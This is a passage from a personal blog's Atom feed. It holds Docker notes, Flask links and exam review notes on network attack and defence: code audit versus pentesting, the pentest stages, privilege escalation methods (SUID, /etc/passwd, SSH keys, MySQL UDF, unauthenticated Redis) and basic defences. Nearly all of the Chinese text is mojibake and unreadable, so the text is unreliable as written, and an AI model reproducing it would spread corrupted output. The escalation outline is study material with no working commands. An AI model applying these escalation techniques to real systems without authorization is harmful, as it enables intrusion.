    <id>https://singlemindedt.github.io/2020/07/31/Docker-notes1/</id>
    <published>2020-07-31T05:14:01.000Z</published>
    <updated>2020-07-31T15:56:47.392Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å–œæ¬¢é’»ç ”å’Œåˆ†äº«ï¼›</p></blockquote><blockquote><p>åªè¦å­¦ä¸æ­»å°±å¾€æ­»é‡Œå­¦;</p></blockquote><h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><blockquote><p>Problemsï¼š</p><ul><li>æˆ‘åœ¨æˆ‘çš„ç”µè„‘ä¸Šå¯ä»¥è¿è¡Œï¼Ÿï¼Ÿï¼Ÿ</li><li>é…ç½®åº”ç”¨ç¯å¢ƒéº»çƒ¦ï¼Œä¸”ä¸å¯è·¨å¹³å°</li></ul></blockquote><p><strong>æ‰“åŒ…é¡¹ç›®å¸¦ä¸Šç¯å¢ƒï¼ˆé•œåƒï¼‰â€“&gt;ï¼ˆDockerä»“åº“=å•†åº—ï¼‰â€“&gt;ä¸‹è½½æˆ‘ä»¬å‘å¸ƒçš„é•œåƒï¼Œå¯ç›´æ¥è¿è¡Œï¼</strong></p><p>æ€æƒ³æ¥æºï¼šé›†è£…ç®±<br>jre:å¤šä¸ªåº”ç”¨ï¼ˆç«¯å£å†²çªï¼‰ï¼Œäº¤å‰ï¼›<br>æ ¸å¿ƒï¼šéš”ç¦»ï¼Œæ¯ä¸ªé›†è£…ç®±éƒ½æ˜¯äº’ç›¸éš”ç¦»çš„ï¼›é€šè¿‡éš”ç¦»æœºåˆ¶å¯å°†æœåŠ¡å™¨åˆ©ç”¨åˆ°æè‡´ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;å–œæ¬¢é’»ç ”å’Œåˆ†äº«ï¼›&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;åªè¦å­¦ä¸æ­»å°±å¾€æ­»é‡Œå­¦;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>æ²™ç®±</title>
    <link href="https://singlemindedt.github.io/2020/07/30/%E6%B2%99%E7%AE%B1/"/>
    <id>https://singlemindedt.github.io/2020/07/30/æ²™ç®±/</id>
    <published>2020-07-30T14:54:37.000Z</published>
    <updated>2020-07-30T16:05:27.344Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
    
      <category term="Definition" scheme="https://singlemindedt.github.io/tags/Definition/"/>
    
  </entry>
  
  <entry>
    <title>pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ</title>
    <link href="https://singlemindedt.github.io/2020/06/21/pycharm%E5%BC%80%E5%8F%91flask%E6%8C%87%E5%AE%9Aip%E3%80%81%E7%AB%AF%E5%8F%A3%E6%97%A0%E6%95%88/"/>
    <id>https://singlemindedt.github.io/2020/06/21/pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ/</id>
    <published>2020-06-20T16:16:09.000Z</published>
    <updated>2020-06-20T16:17:18.697Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/JENREY/article/details/86699817?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ</a></p><p><a href="https://www.cnblogs.com/xiaodai0/p/10460751.html" target="_blank" rel="noopener">pythonâ€”â€“flaské¡¹ç›®ç«¯å£è®¾ç½®æ— æ•ˆ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/JENREY/article/details/86699817?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLea
      
    
    </summary>
    
    
      <category term="flask" scheme="https://singlemindedt.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘ç»œæ”»å‡»ä¸é˜²å¾¡å¤ä¹ </title>
    <link href="https://singlemindedt.github.io/2020/06/12/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%A4%8D%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://singlemindedt.github.io/2020/06/12/ç½‘ç»œæ”»å‡»ä¸é˜²å¾¡å¤ä¹ çŸ¥è¯†ç‚¹æ€»ç»“/</id>
    <published>2020-06-12T05:20:08.000Z</published>
    <updated>2020-06-12T09:07:20.241Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>+++</p><p>1ã€Webå®‰å…¨</p><p>2ã€é€†å‘å®‰å…¨</p><p>3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨</p><h4 id="é¢˜å‹ï¼š"><a href="#é¢˜å‹ï¼š" class="headerlink" title="é¢˜å‹ï¼š"></a><strong>é¢˜å‹ï¼š</strong></h4><p><strong>è®ºè¿°é¢˜ï¼š3*10</strong></p><p>ï¼ˆç®€ç­”é¢˜ï¼Œè®°å¿†ï¼‰</p><p><strong>ææ–™åˆ†æé¢˜ï¼š20</strong></p><p>ï¼ˆä»£ç ç›¸å…³web or  ä»£ç æ— å…³ï¼‰</p><p><strong>ä»£ç åˆ†æé¢˜ï¼š20+30</strong></p><p>ï¼ˆ20Web/30REï¼‰</p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C6.png" alt="6"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C7.png" alt="6"></p><p>+++</p><p>Webæ–¹é¢ä»£ç ä¸»è¦è€ƒï¼š<strong>PHPä»£ç </strong></p><p>+++</p><h3 id="1ã€ä»£ç å®¡è®¡ä¸æ¸—é€æµ‹è¯•çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹"><a href="#1ã€ä»£ç å®¡è®¡ä¸æ¸—é€æµ‹è¯•çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹" class="headerlink" title="1ã€ä»£ç å®¡è®¡ä¸æ¸—é€æµ‹è¯•çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹"></a>1ã€ä»£ç å®¡è®¡ä¸æ¸—é€æµ‹è¯•çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹</h3><p><font color="#ff000" face="é»‘ä½“" size="4">â˜†â˜†â˜†</font></p><table><thead><tr><th></th><th>æ¸—é€æµ‹è¯•ï¼ˆå¨èƒï¼šæ¥è‡ªå¤–éƒ¨å…¥ä¾µï¼‰</th><th>ä»£ç å®¡è®¡ï¼ˆè„†å¼±æ€§ï¼šç³»ç»Ÿè‡ªèº«ã€è½¯ä»¶ç­‰é—®é¢˜ï¼‰</th></tr></thead><tbody><tr><td>æè¿°</td><td>æ¨¡æ‹Ÿé»‘å®¢æ”»å‡»ï¼Œè¯„ä¼°ç›®æ ‡ç³»ç»Ÿå®‰å…¨æ€§</td><td>æŸ¥æ‰¾ç¨‹åºä¸­å­˜åœ¨çš„ä¸å®‰å…¨ç¼–ç </td></tr><tr><td>æµ‹è¯•ç›®æ ‡</td><td>åŒ…æ‹¬ä½†ä¸é™äºWebåº”ç”¨</td><td>åŸºäºæä¾›çš„ç³»ç»Ÿä»£ç ï¼Œå¯»æ‰¾ä»£ç æ¼æ´</td></tr><tr><td>æµ‹è¯•äº§å‡º</td><td>æ¸—é€æµ‹è¯•æŠ¥å‘Š+ä¿®å¤å»ºè®®</td><td>ä»£ç å®¡è®¡æŠ¥å‘Š+ä¿®å¤å»ºè®®</td></tr><tr><td>ä¼˜ç‚¹</td><td>è´´è¿‘å®é™…åœºæ™¯ï¼Œè¿œç¨‹æ¸—é€</td><td>å…¨é¢å®¡æŸ¥ï¼Œè´´è¿‘ç³»ç»Ÿå’Œæ¶æ„ï¼Œä¿®å¤æˆæœ¬ä½</td></tr><tr><td>ç¼ºç‚¹</td><td>æµ‹è¯•ä¸å…¨é¢ï¼Œä¿®å¤æˆæœ¬é«˜</td><td>ç°åœºå®¡è®¡</td></tr></tbody></table><p>+++</p><h3 id="2ã€ä»£ç å®¡è®¡æµç¨‹"><a href="#2ã€ä»£ç å®¡è®¡æµç¨‹" class="headerlink" title="2ã€ä»£ç å®¡è®¡æµç¨‹"></a>2ã€ä»£ç å®¡è®¡æµç¨‹</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C3.png" alt="3"></p><p>æ‹¿åˆ°æºä»£ç åï¼Œå…ˆä½¿ç”¨å·¥å…·è¿›è¡Œæ•´ä½“æ‰«é¢ï¼Œç„¶åå¯¹æ‰«æç»“æ„è¿›è¡Œäººå·¥æ¼æ´ç¡®è®¤ï¼ŒåŒæ—¶ï¼Œè¿›è¡Œäººå·¥å®‰å…¨ç¼–ç å®¡è®¡ï¼Œè¿›è€Œè§£å†³ä¸€äº›å¸¸è§„æ¼æ´å’Œé€»è¾‘æ¼æ´ã€‚æœ€åç»¼åˆå®¡è®¡ç»“æ„ï¼Œç¼–å†™å¹¶æäº¤ä»£ç å®¡è®¡æŠ¥å‘Šã€‚</p><p>+++</p><h3 id="3ã€ä»£ç å®¡è®¡çš„é€šç”¨æ–¹æ³•"><a href="#3ã€ä»£ç å®¡è®¡çš„é€šç”¨æ–¹æ³•" class="headerlink" title="3ã€ä»£ç å®¡è®¡çš„é€šç”¨æ–¹æ³•"></a>3ã€ä»£ç å®¡è®¡çš„é€šç”¨æ–¹æ³•</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C4.png" alt="3"></p><p>+++</p><h3 id="4ã€PHPä»£ç å®¡è®¡ï¼šä»£ç åˆ†æ"><a href="#4ã€PHPä»£ç å®¡è®¡ï¼šä»£ç åˆ†æ" class="headerlink" title="4ã€PHPä»£ç å®¡è®¡ï¼šä»£ç åˆ†æ"></a>4ã€PHPä»£ç å®¡è®¡ï¼šä»£ç åˆ†æ</h3><p><strong>ï¼ˆXSSã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€ä»£ç æ‰§è¡Œã€CSRFç­‰ï¼‰</strong></p><p><font color="#ff000" face="é»‘ä½“" size="4">ååºåˆ—åŒ–æ¼æ´â˜†â˜†â˜†</font></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C8.png" alt="6"></p><p>+++</p><p>æŸ¥çœ‹æ¸—é€æµ‹è¯•æ¡ˆä¾‹ï¼›</p><p>+++</p><h3 id="1ã€æ¸—é€æµ‹è¯•çš„æµç¨‹å’Œæ¯ä¸€æ­¥è¦åšçš„å·¥ä½œ"><a href="#1ã€æ¸—é€æµ‹è¯•çš„æµç¨‹å’Œæ¯ä¸€æ­¥è¦åšçš„å·¥ä½œ" class="headerlink" title="1ã€æ¸—é€æµ‹è¯•çš„æµç¨‹å’Œæ¯ä¸€æ­¥è¦åšçš„å·¥ä½œ"></a>1ã€æ¸—é€æµ‹è¯•çš„æµç¨‹å’Œæ¯ä¸€æ­¥è¦åšçš„å·¥ä½œ</h3><p>æ¸—é€æµ‹è¯•åˆ†ä¸º<strong>ä¸ƒä¸ªé˜¶æ®µ</strong>ï¼š</p><p>1ã€ å‰æœŸäº¤äº’é˜¶æ®µ</p><p>2ã€ æƒ…æŠ¥æœé›†é˜¶æ®µ</p><p>3ã€ å¨èƒå»ºæ¨¡é˜¶æ®µ</p><p>4ã€ æ¼æ´åˆ†æé˜¶æ®µ</p><p>5ã€ æ¸—é€æ”»å‡»é˜¶æ®µ</p><p>6ã€ åæ¸—é€æ”»å‡»é˜¶æ®µ</p><p>7ã€ æŠ¥å‘Šé˜¶æ®µ</p><h4 id="1ã€å‰æœŸäº¤äº’é˜¶æ®µ"><a href="#1ã€å‰æœŸäº¤äº’é˜¶æ®µ" class="headerlink" title="1ã€å‰æœŸäº¤äº’é˜¶æ®µ"></a>1ã€å‰æœŸäº¤äº’é˜¶æ®µ</h4><ul><li>ç¡®å®šæ¸—é€æµ‹è¯•çš„<strong>èŒƒå›´</strong>ï¼ˆå…è®¸æµ‹è¯•ï¼‰å’Œ<strong>ç›®æ ‡</strong>ï¼ˆé¢„æœŸæ•ˆæœï¼‰</li><li>æµ‹è¯•çš„ç±»å‹ï¼ˆé»‘ç›’/ç™½ç›’ï¼‰</li><li>æ—¶é—´æ®µã€è´¹ç”¨ç­‰</li></ul><blockquote><p>ç›®æ ‡ï¼š</p><ul><li>åˆ—å‡ºæ‰€æœ‰æ¼æ´</li><li>è¯æ˜å„ç§æ¼æ´å­˜åœ¨</li><li>æµ‹è¯•å„ç§äº‹ä»¶å“åº”</li><li>å¯¹ç½‘ç»œã€ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºæ¼æ´çš„æ¸—é€æ¨¡å—å¼€å‘</li></ul></blockquote><h4 id="2ã€æƒ…æŠ¥æœé›†é˜¶æ®µï¼ˆæœ€é‡è¦é˜¶æ®µä¹‹ä¸€ï¼Œ40-60-ï¼‰"><a href="#2ã€æƒ…æŠ¥æœé›†é˜¶æ®µï¼ˆæœ€é‡è¦é˜¶æ®µä¹‹ä¸€ï¼Œ40-60-ï¼‰" class="headerlink" title="2ã€æƒ…æŠ¥æœé›†é˜¶æ®µï¼ˆæœ€é‡è¦é˜¶æ®µä¹‹ä¸€ï¼Œ40-60%ï¼‰"></a>2ã€æƒ…æŠ¥æœé›†é˜¶æ®µï¼ˆæœ€é‡è¦é˜¶æ®µä¹‹ä¸€ï¼Œ40-60%ï¼‰</h4><ul><li>é‡‡ç”¨å„ç§æ–¹å¼å°½å¯èƒ½<strong>æ”¶é›†ç›®æ ‡ç½‘ç»œçš„ä¿¡æ¯</strong></li><li>å¤§è‡´æ­¥éª¤ï¼š</li></ul><p>1ã€ <strong>ç›®æ ‡é€‰æ‹©</strong>ï¼šé€‰æ‹©æ”»å‡»ç›®æ ‡ï¼Œç¡®å®šæ”»å‡»æ•ˆæœ</p><p>2ã€ <strong>éšç§æ”¶é›†</strong>ï¼šç°åœºæ‰‹æœº+å¤–éƒ¨æ”¶é›†</p><p>3ã€ <strong>è¸©ç‚¹å·¥ä½œ</strong>ï¼šä¸»åŠ¨å’Œè¢«åŠ¨æ‰«ææŠ€æœ¯</p><p>4ã€ <strong>éªŒè¯ç›®æ ‡çš„å®‰å…¨æœºåˆ¶</strong>ï¼šé˜²ç«å¢™ã€ç½‘ç»œæµé‡è¿‡æ»¤ç³»ç»Ÿã€ç½‘ç»œå’Œä¸»æœºçš„ä¿æŠ¤æªæ–½</p><h4 id="3ã€å¨èƒå»ºæ¨¡é˜¶æ®µ"><a href="#3ã€å¨èƒå»ºæ¨¡é˜¶æ®µ" class="headerlink" title="3ã€å¨èƒå»ºæ¨¡é˜¶æ®µ"></a>3ã€å¨èƒå»ºæ¨¡é˜¶æ®µ</h4><ul><li>æ¨¡æ‹Ÿå‡ºå¯¹ç›®æ ‡çš„å¨èƒä»¥åŠå¨èƒçš„ä½œç”¨ï¼Œæ ¹æ®å¨èƒå¯èƒ½å¯¹ç›®æ ‡ç³»ç»Ÿäº§ç”Ÿçš„å½±å“è¿›è¡Œåˆ†ç±»</li><li>ç»“åˆä¿¡æ¯æ”¶é›†é˜¶æ®µä½œå‡ºçš„åˆ†æï¼Œç¡®å®šæœ€ä½³çš„æ”»å‡»æ–¹å¼</li><li>éœ€è¦è§£å†³çš„é—®é¢˜ï¼š</li></ul><blockquote><p>å¦‚ä½•æ”»å‡»æŒ‡å®šçš„ç½‘ç»œï¼Ÿ<br>        éœ€è¦è·å–çš„é‡è¦ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Ÿ<br>        é‡‡å–ä»€ä¹ˆæ”»å‡»æ–¹å¼æœ€åˆé€‚ï¼Ÿ<br>        å¯¹ç›®æ ‡æœ€å¤§çš„å®‰å…¨å¨èƒæ˜¯ä»€ä¹ˆï¼Ÿ</p></blockquote><p>(æ¼æ´æ‰«æå·¥å…·ï¼ˆ Nexposeæˆ– Metasploit Proï¼‰å¯ä»¥å¸®åŠ©è‡ªåŠ¨åŒ–çš„å¿«é€Ÿçš„å®Œæˆå¨èƒå»ºæ¨¡)</p><h4 id="4ã€æ¼æ´åˆ†æé˜¶æ®µ"><a href="#4ã€æ¼æ´åˆ†æé˜¶æ®µ" class="headerlink" title="4ã€æ¼æ´åˆ†æé˜¶æ®µ"></a>4ã€æ¼æ´åˆ†æé˜¶æ®µ</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C5.png" alt="3"></p><h4 id="5ã€æ¸—é€æ”»å‡»é˜¶æ®µ"><a href="#5ã€æ¸—é€æ”»å‡»é˜¶æ®µ" class="headerlink" title="5ã€æ¸—é€æ”»å‡»é˜¶æ®µ"></a>5ã€æ¸—é€æ”»å‡»é˜¶æ®µ</h4><ul><li>æ¸—é€æ”»å‡»é˜¶æ®µå¯ä»¥<strong>åˆ©ç”¨ä»¥å‰æ¼æ´åˆ†æé˜¶æ®µçš„æˆæœ</strong>ï¼Œæ˜¯<strong>çœŸæ­£çš„æ”»å‡»é˜¶æ®µ</strong></li></ul><h4 id="6ã€åæ¸—é€æ”»å‡»é˜¶æ®µ"><a href="#6ã€åæ¸—é€æ”»å‡»é˜¶æ®µ" class="headerlink" title="6ã€åæ¸—é€æ”»å‡»é˜¶æ®µ"></a>6ã€åæ¸—é€æ”»å‡»é˜¶æ®µ</h4><ul><li>åæ¸—é€æ”»å‡»é˜¶æ®µåŒ…æ‹¬äº†<strong>å½“æˆåŠŸæ¸—é€æ”»å‡»åˆ°å¯¹æ–¹è®¡ç®—æœºä»¥å</strong>çš„å¾ˆå¤šä»»åŠ¡ï¼Œæ¯”å¦‚ææƒã€ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ã€è·³æ¿æ”»å‡»ç­‰</li></ul><p>ï¼ˆä»¥ç‰¹å®šçš„ä¸šåŠ¡ç³»ç»Ÿä¸ºç›®æ ‡ï¼Œè¯†åˆ«å²€å…³é”®åŸºç¡€è®¾æ–½ï¼Œå¹¶å¯»æ‰¾å®¢æˆ·æœ€æœ‰ä»·å€¼çš„èµ„äº§ï¼‰</p><h4 id="7ã€æŠ¥å‘Šé˜¶æ®µ"><a href="#7ã€æŠ¥å‘Šé˜¶æ®µ" class="headerlink" title="7ã€æŠ¥å‘Šé˜¶æ®µ"></a>7ã€æŠ¥å‘Šé˜¶æ®µ</h4><p>æŠ¥å‘Šçš„ä¸»è¦ç»„æˆéƒ¨åˆ†ï¼š</p><ul><li><strong>ç¡®å®š</strong>ç›®æ ‡æœ€ä¸º<strong>é‡è¦çš„å¨èƒ</strong></li><li>å°†æ¸—é€æµ‹è¯•å¾—åˆ°çš„æ•°æ®<strong>ç”Ÿæˆè¡¨æ ¼å’Œå›¾è¡¨</strong></li><li>å¯¹<strong>ç›®æ ‡ç³»ç»Ÿ</strong>çš„<strong>æ”¹è¿›å»ºè®®</strong></li><li>å¯¹é—®é¢˜çš„<strong>ä¿®å¤æ–¹æ¡ˆ</strong></li></ul><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C9.png" alt="6"></p><p>+++</p><p>éœ€è¦ç”¨è‡ªå·±çš„è¯­è¨€æè¿°ï¼›</p><p>+++</p><h3 id="1ã€ä¸ºä»€ä¹ˆè¦ææƒï¼Ÿ"><a href="#1ã€ä¸ºä»€ä¹ˆè¦ææƒï¼Ÿ" class="headerlink" title="1ã€ä¸ºä»€ä¹ˆè¦ææƒï¼Ÿ"></a>1ã€ä¸ºä»€ä¹ˆè¦ææƒï¼Ÿ</h3><p><strong>ææƒ</strong>ï¼šåˆ©ç”¨æ“ä½œç³»ç»Ÿæˆ–åº”ç”¨è½¯ä»¶ä¸­çš„<strong>ç¨‹åºé”™è¯¯</strong>ã€<strong>è®¾è®¡ç¼ºé™·</strong>æˆ–<strong>é…ç½®ä¸å½“</strong>æ¥è·å–å—ä¿æŠ¤èµ„æºçš„<strong>é«˜çº§è®¿é—®æƒé™</strong></p><ul><li>åæ¸—é€æµ‹è¯•é˜¶æ®µï¼Œè·å¾—äº†ç›®æ ‡ç³»ç»Ÿ<strong>ä½æƒé™çš„Shell</strong>ï¼Œå¯¹ç›®æ ‡çš„<strong>æŸäº›è®¿é—®ä¾æ—§å—é™</strong></li><li>éœ€è¦è¿›è¡Œææƒæ“ä½œï¼Œæ¥<strong>è·å¾—ç›®æ ‡ç³»ç»Ÿçš„æœ€é«˜æƒé™</strong></li></ul><p>+++</p><h3 id="2ã€ææƒçš„æ–¹æ³•å’Œæ­¥éª¤-ä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„ææƒæŠ€æœ¯"><a href="#2ã€ææƒçš„æ–¹æ³•å’Œæ­¥éª¤-ä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„ææƒæŠ€æœ¯" class="headerlink" title="2ã€ææƒçš„æ–¹æ³•å’Œæ­¥éª¤/ä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„ææƒæŠ€æœ¯"></a>2ã€ææƒçš„æ–¹æ³•å’Œæ­¥éª¤/ä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„ææƒæŠ€æœ¯</h3><h4 id="1ã€Windowsç³»ç»Ÿææƒçš„ä¸€èˆ¬æ­¥éª¤"><a href="#1ã€Windowsç³»ç»Ÿææƒçš„ä¸€èˆ¬æ­¥éª¤" class="headerlink" title="1ã€Windowsç³»ç»Ÿææƒçš„ä¸€èˆ¬æ­¥éª¤"></a>1ã€Windowsç³»ç»Ÿææƒçš„ä¸€èˆ¬æ­¥éª¤</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C6.png" alt="3"></p><ul><li>åˆ©ç”¨å†…æ ¸æ¼æ´ææƒï¼ˆMS13_053 etc.ï¼‰</li><li>åˆ©ç”¨æ“ä½œç³»ç»Ÿæ¼æ´ææƒï¼š</li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C7.png" alt="3"></p><ul><li>åˆ©ç”¨åº”ç”¨ç¨‹åºæ¼æ´ææƒ</li></ul><h4 id="2ã€Linuxç³»ç»Ÿææƒ"><a href="#2ã€Linuxç³»ç»Ÿææƒ" class="headerlink" title="2ã€Linuxç³»ç»Ÿææƒ"></a>2ã€Linuxç³»ç»Ÿææƒ</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C8.png" alt="3"></p><ul><li>SUIDç¨‹åºææƒ</li><li>ä¿®æ”¹ç”¨æˆ·å±ç»„ï¼ˆæ–‡ä»¶æƒé™é…ç½®ä¸å½“ï¼‰</li><li>ä¿®æ”¹/etc/ passwd</li><li>ä¿®æ”¹rootç”¨æˆ·sshå¯†é’¥</li><li>é€šé…ç¬¦ææƒ</li><li>åº”ç”¨ç¨‹åºææƒ</li></ul><h4 id="3ã€æ•°æ®åº“UDFææƒ"><a href="#3ã€æ•°æ®åº“UDFææƒ" class="headerlink" title="3ã€æ•°æ®åº“UDFææƒ"></a>3ã€æ•°æ®åº“UDFææƒ</h4><p>UDF:User Defined Function</p><p>å‰ææ¡ä»¶ï¼š</p><ol><li>è·å¾—rootè´¦æˆ·å¯†ç </li><li>æ•°æ®åº“å¼€å¯ plugin</li><li>æ•°æ®åº“ç›‘å¬å…¬ç½‘</li></ol><h4 id="4ã€Redisææƒï¼ˆæœªæˆæƒè®¿é—®ç­‰æ¼æ´ï¼‰"><a href="#4ã€Redisææƒï¼ˆæœªæˆæƒè®¿é—®ç­‰æ¼æ´ï¼‰" class="headerlink" title="4ã€Redisææƒï¼ˆæœªæˆæƒè®¿é—®ç­‰æ¼æ´ï¼‰"></a>4ã€Redisææƒï¼ˆæœªæˆæƒè®¿é—®ç­‰æ¼æ´ï¼‰</h4><p>Redisæ•°æ®åº“ä»¥rootæƒé™å¯åŠ¨ï¼Œé…åˆæœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¿æ¥æ•°æ®åº“å¹¶å†™å…¥sshå¯†é’¥ï¼Œæ¥ç€å°±å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•æœåŠ¡å™¨</p><p>+++</p><h3 id="3ã€ææƒçš„é˜²å¾¡"><a href="#3ã€ææƒçš„é˜²å¾¡" class="headerlink" title="3ã€ææƒçš„é˜²å¾¡"></a>3ã€ææƒçš„é˜²å¾¡</h3><ul><li>åŠæ—¶æ‰“è¡¥ä¸</li><li>å¯åŠ¨Webã€DBæœåŠ¡æ—¶ä»¥ä½æƒé™å¯åŠ¨ï¼ˆæœ€å°æƒé™åŸåˆ™ï¼‰</li><li>æœåŠ¡åªç›‘å¬127.0.0.1ï¼ˆä¸è¦å¼€åœ¨å…¬ç½‘ï¼‰</li></ul><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C10.png" alt="6"></p><p>+++</p><p>æœ€åä¸€é¢˜30åˆ†ï¼ˆREï¼Œåˆ†ææ±‡ç¼–è¯­è¨€ä»£ç ï¼›ç»™å‡ºé«˜çº§è¯­è¨€ç”¨æ±‡ç¼–åˆ†æ/ç»™å‡ºä»»åŠ¡è¦æ±‚å†™å‡ºæ±‡ç¼–ï¼›è¯¾ä¸Šç”¨åˆ°çš„â€”å…³äºå †æ ˆæ–¹é¢çš„æ±‡ç¼–ä»£ç ï¼‰</p><p>ç»™å‡ºæ±‡ç¼–ï¼Œè¯´æ˜è¯¥æ®µä»£ç çš„å…·ä½“æ„ä¹‰ï¼Œå¦‚ä½•å·¥ä½œï¼›</p><p><strong>è°ƒç”¨çº¦å®š</strong>ï¼Œå››ç§å¸¸è§çš„ï¼Œ<strong>å †æ ˆçš„å˜åŒ–</strong>ï¼šæ ¹æ®ä»£ç ç”»å‡ºå †æ ˆå˜åŒ–æƒ…å†µï¼›</p><p>ï¼ˆå †ï¼Œä¸è€ƒï¼‰</p><p>+++</p><h3 id="1ã€å­—èŠ‚åº"><a href="#1ã€å­—èŠ‚åº" class="headerlink" title="1ã€å­—èŠ‚åº"></a>1ã€å­—èŠ‚åº</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C9.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C29.png" alt="3"></p><p><a href="https://www.k2zone.cn/?p=1911" target="_blank" rel="noopener">å‡½æ•°æ ˆ&amp;EIPã€EBPã€ESP</a></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C31.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C30.png" alt="3"></p><ul><li><p>å°†ebxã€exiã€ediå‹å…¥æ ˆçš„åŸå› ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">push esi</span><br><span class="line">push edi</span><br></pre></td></tr></table></figure><p>ä¿å­˜å¯„å­˜å™¨åŸæœ‰çš„å€¼ï¼ˆä¿å­˜åœ¨äº†æ 